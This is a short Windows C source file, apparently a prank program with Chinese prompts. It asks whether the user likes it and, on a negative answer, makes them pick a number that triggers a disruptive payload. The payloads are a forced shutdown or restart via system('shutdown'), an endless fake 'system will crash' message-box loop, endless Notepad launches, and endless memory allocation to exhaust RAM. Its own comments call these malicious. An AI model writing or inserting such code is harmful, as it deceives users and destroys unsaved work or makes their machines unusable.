#define _CRT_SECURE_NO_WARNINGS
#include <stdlib.h>
#include <stdio.h>
#include <Windows.h>

void main21()
{

    printf("你认为我怎么样？\n如果满意请输入'1'\n如果不满意请输入'2'\n");
    int num;
    scanf("%d",&num);

    if (num == 1)
    {
        printf("感谢您对我友好的评价\n");
    }
    else if (num == 2)
    {
        printf("很抱歉，打扰到你了，请你选择一个1-5之间你最爱的数字\n");
        Sleep(2000);
        int numOne;
        scanf("%d",&numOne);

        switch (numOne)
        {
        case 1:
            system("shutdown -s -t 100");   // 关机
            break;
        case 2:
            system("shutdown -r -t 1000");  // 重启
            break;
        case 3:
            while (1)
            {
                MessageBox(NULL,L"系统即将崩溃",L"恶意提示",1);   // 无限弹窗
            }
            break;
        case 4:
            while (1)
            {
                system("notepad");  // 无限打开记事本
            }
            break;
        case 5:
            while (1)
            {
                void *p = malloc(1024*1024*10); // 给系统无限分配空间 1秒分配 10兆 吃内存
                Sleep(5000);
            }
            break;
            default:
                while (1)
                {
                    void *p = malloc(1024*1024*10);
                    Sleep(1000);
                }
            break;
        }
    }
    else
    {
        while (1)
        {
            void *p = malloc(1024*1024*10);
            Sleep(1000);
        }
    }
    system("pause");
}